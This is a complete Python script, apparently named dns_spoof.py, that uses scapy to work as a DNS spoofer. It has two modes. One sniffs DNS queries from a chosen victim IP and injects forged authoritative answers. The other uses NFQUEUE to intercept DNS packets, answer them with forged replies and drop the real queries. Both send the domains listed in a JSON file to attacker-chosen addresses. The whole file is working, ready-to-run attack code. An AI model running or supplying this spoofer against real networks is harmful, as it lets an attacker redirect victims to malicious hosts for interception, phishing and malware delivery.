#!/usr/bin/env python3

import argparse
import json
import signal
import sys
import time
from functools import partial

try:
    from scapy.all import (
        sniff,
        send,
        sendp,
        IP,
        UDP,
        DNS,
        DNSQR,
        DNSRR,
        Ether,
    )
except Exception as e:
    print("ERROR: scapy is required. Install it inside your VM (pip3 install scapy).", file=sys.stderr)
    raise

# netfilterqueue is optional
try:
    from netfilterqueue import NetfilterQueue
    HAVE_NFQUEUE = True
except Exception:
    HAVE_NFQUEUE = False


def load_hosts(path):
    with open(path) as f:
        j = json.load(f)
    # normalize keys to lower-case without trailing dot
    out = {k.lower().rstrip("."): str(v) for k, v in j.items()}
    return out


def normalize_name(qname):
    if isinstance(qname, bytes):
        s = qname.decode(errors="ignore")
    else:
        s = str(qname)
    if s.endswith('.'):
        s = s[:-1]
    return s.lower()


def craft_response_ip(pkt, fake_ip):
    """Build an IP-layer DNS response (swap src/dst) from a DNS query packet."""
    ip = pkt[IP]
    udp = pkt[UDP]
    dns = pkt[DNS]
    ip_layer = IP(src=ip.dst, dst=ip.src)
    udp_layer = UDP(sport=53, dport=udp.sport)
    answer = DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip)
    resp = DNS(
        id=dns.id,
        qr=1,
        aa=1,
        rd=dns.rd,
        ra=1,
        qd=dns.qd,
        an=answer,
        ancount=1,
    )
    return ip_layer / udp_layer / resp


def craft_response_ether(pkt, fake_ip):
    """Build an Ethernet-level DNS response (useful if sending at L2 is needed).
    pkt must be a full packet containing Ether/IP/UDP/DNS.
    """
    eth = pkt.getlayer(Ether)
    ip = pkt[IP]
    udp = pkt[UDP]
    dns = pkt[DNS]
    # swap macs and ips
    eth_resp = Ether(src=eth.dst, dst=eth.src)
    ip_layer = IP(src=ip.dst, dst=ip.src)
    udp_layer = UDP(sport=53, dport=udp.sport)
    answer = DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip)
    dns_resp = DNS(
        id=dns.id,
        qr=1,
        aa=1,
        rd=dns.rd,
        ra=1,
        qd=dns.qd,
        an=answer,
        ancount=1,
    )
    return eth_resp / ip_layer / udp_layer / dns_resp


def handle_sniff(pkt, iface, hosts, repeat, delay, send_at_l2, verbose):
    # only handle DNS queries
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS)):
        return
    dns = pkt[DNS]
    if dns.qr != 0:  # not a query
        return
    try:
        qname = dns.qd.qname
    except Exception:
        return
    name = normalize_name(qname)
    if name not in hosts:
        if verbose:
            print(f"[IGNORED] {name}")
        return
    fake_ip = hosts[name]
    if send_at_l2 and pkt.haslayer(Ether):
        resp = craft_response_ether(pkt, fake_ip)
        for _ in range(repeat):
            sendp(resp, iface=iface, verbose=0)
            time.sleep(delay)
    else:
        resp = craft_response_ip(pkt, fake_ip)
        for _ in range(repeat):
            send(resp, iface=iface, verbose=0)
            time.sleep(delay)
    print(f"[SPOOFED] {name} -> {fake_ip} for {pkt[IP].src} id={dns.id}")


def nfqueue_process(pkt, hosts, queue_num, verbose):
    # pkt is a netfilterqueue packet
    try:
        scapy_pkt = IP(pkt.get_payload())
    except Exception:
        pkt.accept()
        return
    # handle UDP DNS queries
    if scapy_pkt.haslayer(UDP) and scapy_pkt.haslayer(DNS) and scapy_pkt[DNS].qr == 0:
        dns = scapy_pkt[DNS]
        try:
            qname = dns.qd.qname
        except Exception:
            pkt.accept()
            return
        name = normalize_name(qname)
        if name in hosts:
            fake_ip = hosts[name]
            ip_layer = IP(src=scapy_pkt[IP].dst, dst=scapy_pkt[IP].src)
            udp_layer = UDP(sport=53, dport=scapy_pkt[UDP].sport)
            resp_dns = DNS(
                id=dns.id,
                qr=1,
                aa=1,
                rd=dns.rd,
                ra=1,
                qd=dns.qd,
                an=DNSRR(rrname=dns.qd.qname, type='A', ttl=300, rdata=fake_ip),
                ancount=1,
            )
            resp = ip_layer / udp_layer / resp_dns
            send(resp, verbose=0)
            if verbose:
                print(f"[SPOOFED-NFQ] {name} -> {fake_ip} for {scapy_pkt[IP].src} id={dns.id}")
            pkt.drop()
            return
    pkt.accept()


def setup_nfqueue(hosts, queue_num, verbose):
    if not HAVE_NFQUEUE:
        print("NetfilterQueue python binding not present. Install python3-netfilterqueue or use sniff mode.")
        sys.exit(1)
    nfq = NetfilterQueue()
    nfq.bind(queue_num, lambda p: nfqueue_process(p, hosts, queue_num, verbose))
    print(f"Listening on NFQUEUE {queue_num} ... (ctrl-c to stop)")
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("Stopping NFQUEUE listener")
    finally:
        nfq.unbind()


def main():
    p = argparse.ArgumentParser(description="dns_spoof.py - sniff+inject or nfqueue based DNS spoofer")
    p.add_argument("--mode", choices=['sniff', 'nfqueue'], default='sniff', help='Operation mode')
    p.add_argument("-i", "--iface", default='eth0', help='Interface to sniff/send on')
    p.add_argument("-t", "--target", help='Victim IP to filter for (sniff mode)')
    p.add_argument("-c", "--hosts", required=True, help='JSON file mapping domain->ip')
    p.add_argument("-r", "--repeat", type=int, default=4, help='Number of replies to send')
    p.add_argument("-d", "--delay", type=float, default=0.02, help='Delay between replies (s)')
    p.add_argument("--l2", action='store_true', help='Send at Ethernet layer (sendp) when sniffing')
    p.add_argument("-q", "--queue", type=int, default=0, help='NFQUEUE number (nfqueue mode)')
    p.add_argument("--verbose", action='store_true')
    args = p.parse_args()

    hosts = load_hosts(args.hosts)
    if not hosts:
        print("No hosts loaded — exiting")
        sys.exit(1)
    print("Targets:", hosts)

    def stop_handler(sig, frame):
        print("Stopping...")
        sys.exit(0)

    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    if args.mode == 'nfqueue':
        print("NFQUEUE mode selected")
        print("Make sure you created an iptables/nft rule to send DNS packets to the queue.")
        setup_nfqueue(hosts, args.queue, args.verbose)
    else:
        if not args.target:
            print("In sniff mode you must supply --target (victim IP). Exiting.")
            sys.exit(1)
        bpf = f"udp and port 53 and src host {args.target}"
        print("Sniff mode: filter=", bpf)
        sniff(iface=args.iface, filter=bpf, prn=lambda pkt: handle_sniff(pkt, args.iface, hosts, args.repeat, args.delay, args.l2, args.verbose), store=0)


if __name__ == '__main__':
    main()
